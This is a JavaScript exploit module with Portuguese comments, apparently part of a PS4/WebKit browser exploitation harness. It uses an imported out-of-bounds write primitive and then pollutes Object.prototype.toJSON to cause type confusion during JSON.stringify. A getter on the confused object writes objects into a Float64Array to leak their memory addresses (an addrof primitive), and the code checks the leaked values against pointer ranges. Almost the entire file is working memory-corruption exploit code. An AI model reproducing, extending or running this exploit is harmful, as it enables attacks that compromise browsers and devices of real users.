// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - Correção de Escopo)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF, 0x7FFFFFFF];

// CERTIFIQUE-SE QUE ESTA CONSTANTE ESTÁ DEFINIDA NO ESCOPO DO MÓDULO (TOPO DO ARQUIVO)
const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282; 
const PROBE_CALL_LIMIT_V82 = 10;

// Globais do módulo (mínimos)
let object_to_leak_A_v82 = null; 
let object_to_leak_B_v82 = null; 

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (AdvancedGetterLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null,
        toJSON_details: null, 
        stringifyResult: null,
        addrof_A_result: { success: false, msg: "Addrof A (Getter): Not triggered or failed.", value: null },
        addrof_B_result: { success: false, msg: "Addrof B (Direct): Not triggered or failed.", value: null },
        oob_value_used: null,
        heisenbug_on_M2_confirmed: false
    };
    
    let final_probe_call_count_for_report = 0; // << CORRIGIDO: Variável no escopo da função para a contagem de chamadas

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; // Contagem de chamadas para esta iteração específica
        let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null;
        let marker_M2_ref_iter = null;
        let iteration_tc_details_capture = null; 
        let iteration_tc_capture_flag = false;  

        object_to_leak_A_v82 = { marker_A_v82: `LeakA_OOB_Val${toHex(current_oob_value)}` };
        object_to_leak_B_v82 = { marker_B_v82: `LeakB_OOB_Val${toHex(current_oob_value)}` };
        
        // Definir a sonda DENTRO do loop para criar um closure
        function toJSON_TA_Probe_Iter_Closure() {
            probe_call_count_iter++; // Usa a variável da iteração (closure)
            const call_num = probe_call_count_iter;

            const current_this_type_str = Object.prototype.toString.call(this);
            const is_this_M2_confused = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && current_this_type_str === '[object Object]');

            logS3(`[PROBE_ITER] Call #${call_num}. 'this': ${current_this_type_str}. IsM2Confused? ${is_this_M2_confused}. Iter TC Captured? ${iteration_tc_capture_flag}`, "leak");

            try {
                if (call_num > PROBE_CALL_LIMIT_V82) {
                    logS3(`[PROBE_ITER] Call #${call_num}: Probe call limit exceeded.`, "warn");
                    return { recursion_stopped_iter: true, reason: "Probe call limit exceeded" };
                }

                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_v82: "M2_V82_Target_Iter", some_prop_M2: "M2_Initial_Value_Iter" };
                    marker_M1_ref_iter = { marker_id_v82: "M1_V82_Container_Iter", payload_M2: marker_M2_ref_iter };
                    logS3(`[PROBE_ITER] Call #${call_num} (Victim): M1_iter and M2_iter markers created. Returning M1_iter.`, "info");
                    return marker_M1_ref_iter;
                } else if (is_this_M2_confused) {
                    logS3(`[PROBE_ITER] Call #${call_num} (M2 Confused): TYPE CONFUSION ON M2 ('this') DETECTED! ID: ${this.marker_id_v82}.`, "vuln");

                    let m2_interaction_log_entry = {
                        call_number_tc_detected: call_num,
                        probe_variant: "TA_Probe_Iter_Closure", this_type: "[object Object]",
                        this_is_M2: true, 
                        getter_defined: false, direct_prop_set: false, getter_fired_during_stringify: false,
                        leaked_value_from_getter_as_int64_str: null, leaked_value_is_potential_ptr: false,
                        error_in_probe: null
                    };

                    try {
                        Object.defineProperty(this, 'leaky_A_getter_v82', {
                            get: function () {
                                logS3(`[PROBE_ITER] !!! Getter 'leaky_A_getter_v82' (defined in M2 probe call #${m2_interaction_log_entry.call_number_tc_detected}) FIRED !!!`, "vuln");
                                m2_interaction_log_entry.getter_fired_during_stringify = true;

                                if (!victim_typed_array_ref_iter || !victim_typed_array_ref_iter.buffer) {
                                    m2_interaction_log_entry.leaked_value_from_getter_as_int64_str = "getter_victim_null_err"; return "getter_victim_null_err";
                                }
                                let victim_float_view = new Float64Array(victim_typed_array_ref_iter.buffer);
                                let victim_u32_view = new Uint32Array(victim_typed_array_ref_iter.buffer);
                                const original_victim_val_idx0_low = victim_u32_view[0], original_victim_val_idx1 = victim_u32_view[1];
                                victim_float_view[0] = object_to_leak_A_v82; 
                                let lvf = victim_float_view[0], llo = victim_u32_view[0], lhi = victim_u32_view[1];
                                let lis = new AdvancedInt64(llo, lhi).toString(true);
                                victim_u32_view[0] = original_victim_val_idx0_low; victim_u32_view[1] = original_victim_val_idx1;
                                m2_interaction_log_entry.leaked_value_from_getter_as_int64_str = lis;
                                logS3(`[PROBE_ITER] Getter: Val: ${lis}`, "leak");
                                const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                                if (!nan_inf && lhi !== 0) {
                                    if ((lhi >= 0xFFFF0000) || (lhi > 0 && lhi < 0xF0000) || (lhi >= 0x100000 && lhi < 0x7F000000)) { // AJUSTAR INTERVALOS PARA PS4
                                        m2_interaction_log_entry.leaked_value_is_potential_ptr = true; return lvf;
                                    } return "getter_val_not_in_ptr_range";
                                } return "getter_val_is_nan_inf_or_zero";
                            }, enumerable: true, configurable: true
                        });
                        m2_interaction_log_entry.getter_defined = true;
                        this.leaky_B_direct_v82 = object_to_leak_B_v82; 
                        m2_interaction_log_entry.direct_prop_set = true;
                    } catch (e_m2_int) {
                        m2_interaction_log_entry.error_in_probe = `M2_Interact_Err: ${e_m2_int.message || String(e_m2_int)}`;
                    }

                    if (!iteration_tc_capture_flag) { 
                        iteration_tc_details_capture = JSON.parse(JSON.stringify(m2_interaction_log_entry));
                        iteration_tc_capture_flag = true;
                        logS3(`[PROBE_ITER] Call #${call_num} (M2 Confused): Iteration M2 details CAPTURED. Flag SET. Value: ${JSON.stringify(iteration_tc_details_capture)}`, "vuln");
                    } else {
                        logS3(`[PROBE_ITER] Call #${call_num} (M2 Confused): Iteration M2 details CAPTURE SKIPPED (flag was true).`, "warn");
                    }
                    return this;
                }
            } catch (e_probe) {
                return { error_in_probe_iter: call_num, message: e_probe.message || String(e_probe) };
            }
            return { generic_marker_iter: call_num, original_this_type: current_this_type_str };
        }

        let iter_raw_stringify_output = null;
        let iter_stringify_output_parsed = null;
        let iter_error = null;
        let iter_addrof_A = { success: false, msg: "Getter: Default", value: null };
        let iter_addrof_B = { success: false, msg: "Direct: Default", value: null };
        let heisenbugConfirmedThisIter = false;
        
        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done. Offset: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            // A constante FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD deve estar acessível aqui (escopo do módulo)
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            logS3(`  Victim Uint8Array created and filled.`, "info", FNAME_CURRENT_ITERATION);

            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                logS3(`  toJSON polluted. Calling JSON.stringify...`, "info", FNAME_CURRENT_ITERATION);
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  JSON.stringify completed. Raw: ${iter_raw_stringify_output}`, "info", FNAME_CURRENT_ITERATION);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); }
                catch (e_parse) { 
                    logS3(`  ERROR parsing JSON output: ${e_parse.message}`, "error", FNAME_CURRENT_ITERATION);
                    iter_stringify_output_parsed = { error_parsing_json: iter_raw_stringify_output }; 
                }
                
                if (iteration_tc_details_capture && iteration_tc_details_capture.this_is_M2 && iteration_tc_details_capture.this_type === "[object Object]") {
                    heisenbugConfirmedThisIter = true;
                    logS3(`  EXECUTE: Heisenbug (TC on M2) CONFIRMED via iteration_tc_details_capture.`, "vuln", FNAME_CURRENT_ITERATION);
                    logS3(`  EXECUTE: Captured M2 details: ${JSON.stringify(iteration_tc_details_capture)}`, "leak", FNAME_CURRENT_ITERATION);

                    const m2_summary = iteration_tc_details_capture.m2_interaction_summary || iteration_tc_details_capture;
                    if (m2_summary) {
                        iter_addrof_A.value = m2_summary.leaked_value_from_getter_as_int64_str;
                        if (m2_summary.leaked_value_is_potential_ptr) {
                            iter_addrof_A.success = true;
                            iter_addrof_A.msg = `Potential pointer from getter: ${m2_summary.leaked_value_from_getter_as_int64_str}`;
                        } else {
                            iter_addrof_A.msg = `Getter val ${m2_summary.leaked_value_from_getter_as_int64_str || 'N/A'} not deemed pointer.`;
                        }
                    } else { iter_addrof_A.msg = "M2 summary missing in TC details."; }
                    
                    let m2_obj_from_json = iter_stringify_output_parsed?.payload_M2 || iter_stringify_output_parsed;
                    if (m2_obj_from_json && marker_M2_ref_iter && m2_obj_from_json.marker_id_v82 === marker_M2_ref_iter.marker_id_v82) {
                        const val_direct = m2_obj_from_json.leaky_B_direct_v82;
                        iter_addrof_B.value = val_direct;
                        if (val_direct && object_to_leak_B_v82 && val_direct.marker_B_v82 === object_to_leak_B_v82.marker_B_v82) {
                            iter_addrof_B.success = true; iter_addrof_B.msg = `objB identity confirmed.`;
                        } else { iter_addrof_B.msg = `Direct prop not objB identity.`; }
                    } else { iter_addrof_B.msg = "M2 payload not in stringify output for leaky_B."; }
                } else {
                    logS3(`  EXECUTE: Heisenbug (TC on M2) NOT Confirmed. iteration_tc_details_capture: ${JSON.stringify(iteration_tc_details_capture)}`, "error", FNAME_CURRENT_ITERATION);
                    iter_addrof_A.msg = "TC on M2 not confirmed by iteration_tc_details_capture.";
                    iter_addrof_B.msg = "TC on M2 not confirmed by iteration_tc_details_capture.";
                }
            } catch (e_str) { 
                iter_error = e_str; 
                logS3(`  ERROR during JSON.stringify/probe: ${e_str.message || String(e_str)}`, "critical", FNAME_CURRENT_ITERATION);
            } 
            finally {
                if (pollutionApplied) {
                    if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                    else delete Object.prototype[ppKey];
                }
            }
        } catch (e_outer) { 
            iter_error = e_outer; 
            logS3(`  CRITICAL ERROR in iteration: ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_ITERATION);
        } 
        finally {
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }

        final_probe_call_count_for_report = probe_call_count_iter; // Salva a contagem desta iteração

        let current_iter_summary = {
            oob_value: toHex(current_oob_value),
            error: iter_error ? (iter_error.message || String(iter_error)) : null,
            toJSON_details_this_iter: iteration_tc_details_capture, 
            stringify_output_this_iter: iter_stringify_output_parsed,
            addrof_A_this_iter: iter_addrof_A, addrof_B_this_iter: iter_addrof_B,
            heisenbug_on_M2_this_iter: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);
        
        const old_best_score = (best_result_for_runner.addrof_A_result.success || best_result_for_runner.addrof_B_result.success) ? 2 : (best_result_for_runner.heisenbug_on_M2_confirmed ? 1 : 0);
        const current_score = (iter_addrof_A.success || iter_addrof_B.success) ? 2 : (heisenbugConfirmedThisIter ? 1 : 0);

        if (current_score > old_best_score || (current_score > 0 && !best_result_for_runner.oob_value_used) ) {
             best_result_for_runner = {
                errorOccurred: iter_error ? (iter_error.message || String(iter_error)) : null,
                toJSON_details: iteration_tc_details_capture, 
                stringifyResult: iter_stringify_output_parsed,
                addrof_A_result: iter_addrof_A, addrof_B_result: iter_addrof_B,
                oob_value_used: toHex(current_oob_value),
                heisenbug_on_M2_confirmed: heisenbugConfirmedThisIter
            };
        } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = { 
                errorOccurred: iter_error ? (iter_error.message || String(iter_error)) : best_result_for_runner.errorOccurred,
                toJSON_details: iteration_tc_details_capture, stringifyResult: iter_stringify_output_parsed,
                addrof_A_result: iter_addrof_A, addrof_B_result: iter_addrof_B,
                oob_value_used: toHex(current_oob_value), heisenbug_on_M2_confirmed: heisenbugConfirmedThisIter
            };
        }
        
        if (iter_addrof_A.success || iter_addrof_B.success) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: AddrLeaked! Val${toHex(current_oob_value)}`;
        else if (heisenbugConfirmedThisIter) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: TC Confirmed Val${toHex(current_oob_value)}`;
        await PAUSE_S3(200);
    } // Fim do loop for

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result for runner (detailed): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return { 
        errorOccurred: best_result_for_runner.errorOccurred,
        toJSON_details: best_result_for_runner.toJSON_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_A_result: best_result_for_runner.addrof_A_result,
        addrof_B_result: best_result_for_runner.addrof_B_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report, // << CORRIGIDO: Usa a variável do escopo da função
        oob_value_of_best_result: best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed
    };
}
